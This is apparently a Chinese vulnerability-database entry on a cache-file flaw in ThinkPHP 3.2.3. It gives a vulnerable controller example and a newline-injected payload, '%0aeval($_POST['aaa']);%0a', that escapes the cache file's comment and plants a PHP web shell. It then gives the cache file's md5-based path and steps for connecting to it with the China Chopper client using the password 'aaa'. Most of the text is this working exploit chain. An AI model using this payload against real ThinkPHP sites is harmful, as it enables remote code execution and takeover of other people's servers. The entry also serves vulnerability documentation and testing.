---
title: 'Thinkphp 3.2.3 缓存漏洞'
date: Thu, 27 Aug 2020 15:46:34 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 影响范围

Thinkphp 3.2.3

### 漏洞产生条件

此版本默认的缓存处理机制中，缓存文件是一个可访问的.php文件，编程人员把用户可控参数写入缓存则会产生漏洞。

### 漏洞验证POC

##### 获取用户可控参数写入缓存

例：

```
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {

    public function index(){
        $a=I('post.a');
        S('name',$a);
    }
}
```

##### 用户传参数：

```
?a=%0aeval($_POST['aaa']);%0a
```

%0a为换行符，默认存入缓存文件时用户参数存在于注释中。

##### 写入缓存文件，文件名为md5加密

```
md5(name)
```

##### 文件默认路径

```
<domain>/Application/Runtime/Temp/<md5>.php
```

##### 菜刀连接

```
http://xxxxxxx/Application/Runtime/Temp/<md5>.php 密码aaa
```